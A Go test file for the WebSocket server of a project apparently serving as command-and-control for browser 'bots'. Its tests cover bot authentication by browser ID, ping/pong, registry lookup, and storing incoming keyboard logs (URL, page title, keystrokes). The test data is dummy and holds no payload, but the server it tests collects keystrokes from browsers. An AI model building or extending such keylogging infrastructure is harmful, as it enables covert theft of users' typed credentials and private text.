package ws

import (
	"context"
	"encoding/json"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
	"nhooyr.io/websocket"

	"github.com/s045pd/cursed-go/internal/db/models"
	"github.com/s045pd/cursed-go/internal/utils"
)

func newWSDB(t *testing.T) *gorm.DB {
	t.Helper()
	g, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if err := g.AutoMigrate(models.All()...); err != nil {
		t.Fatal(err)
	}
	return g
}

// runServer spins up the WS handler on an httptest server and returns
// the dial URL.
func runServer(t *testing.T, srv *Server) (string, func()) {
	t.Helper()
	hs := httptest.NewServer(srv.Handler())
	url := strings.Replace(hs.URL, "http://", "ws://", 1)
	return url, hs.Close
}

func TestWS_AuthAndPing(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	url, stop := runServer(t, srv)
	defer stop()

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()

	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	// Read AUTH probe
	_, msg, err := conn.Read(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var probe Envelope
	if err := json.Unmarshal(msg, &probe); err != nil {
		t.Fatal(err)
	}
	if probe.Action != ActionAuth {
		t.Fatalf("expected AUTH probe, got %s", probe.Action)
	}

	// Reply with our browser_id
	browserID := uuid.NewString()
	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
	resp := Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth}
	b, _ := json.Marshal(resp)
	if err := conn.Write(ctx, websocket.MessageText, b); err != nil {
		t.Fatal(err)
	}

	// Wait for bot to land in registry
	deadline := time.Now().Add(2 * time.Second)
	for srv.Registry().ByBrowserID(browserID) == nil && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}
	if srv.Registry().ByBrowserID(browserID) == nil {
		t.Fatal("bot not registered")
	}

	// Send a PING; expect PONG
	pingPayload := Envelope{ID: "ping-1", Action: ActionPing}
	pb, _ := json.Marshal(pingPayload)
	if err := conn.Write(ctx, websocket.MessageText, pb); err != nil {
		t.Fatal(err)
	}
	_, pongRaw, err := conn.Read(ctx)
	if err != nil {
		t.Fatal(err)
	}
	var pong Envelope
	_ = json.Unmarshal(pongRaw, &pong)
	if pong.Action != ActionPong {
		t.Errorf("expected PONG, got %s", pong.Action)
	}
}

func TestWS_KeyboardLogPersists(t *testing.T) {
	gdb := newWSDB(t)
	srv := New(gdb, utils.NewLogger())
	url, stop := runServer(t, srv)
	defer stop()

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	conn, _, err := websocket.Dial(ctx, url, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close(websocket.StatusNormalClosure, "")

	// AUTH
	_, msg, _ := conn.Read(ctx)
	var probe Envelope
	_ = json.Unmarshal(msg, &probe)
	browserID := uuid.NewString()
	authData, _ := json.Marshal(AuthData{BrowserID: browserID})
	b, _ := json.Marshal(Envelope{ID: probe.ID, Action: ActionAuth, Data: authData, OriginAction: ActionAuth})
	conn.Write(ctx, websocket.MessageText, b)

	// Wait for registration
	deadline := time.Now().Add(2 * time.Second)
	for srv.Registry().ByBrowserID(browserID) == nil && time.Now().Before(deadline) {
		time.Sleep(20 * time.Millisecond)
	}

	// Send KEYBOARD_LOGS
	logsData, _ := json.Marshal(map[string]any{"url": "https://x", "title": "t", "keys": "abc"})
	logsEnv, _ := json.Marshal(Envelope{ID: "k-1", Action: ActionKeyboardLogs, Data: logsData})
	conn.Write(ctx, websocket.MessageText, logsEnv)

	// Wait for persistence
	var n int64
	deadline = time.Now().Add(2 * time.Second)
	for n == 0 && time.Now().Before(deadline) {
		gdb.Model(&models.BotKeyboardLog{}).Count(&n)
		time.Sleep(20 * time.Millisecond)
	}
	if n != 1 {
		t.Errorf("keyboard logs row count = %d, want 1", n)
	}
}

func TestRegistry_RegisterAndLookup(t *testing.T) {
	r := NewRegistry()
	s := &Session{BrowserID: "abc", BotID: uuid.New()}
	r.Register(s)
	if r.ByBrowserID("abc") != s {
		t.Error("byBrowserID lookup failed")
	}
	if r.ByBotID(s.BotID) != s {
		t.Error("byBotID lookup failed")
	}
	if r.Count() != 1 {
		t.Error("Count != 1")
	}
	r.Unregister(s)
	if r.ByBrowserID("abc") != nil {
		t.Error("byBrowserID still present after unregister")
	}
}
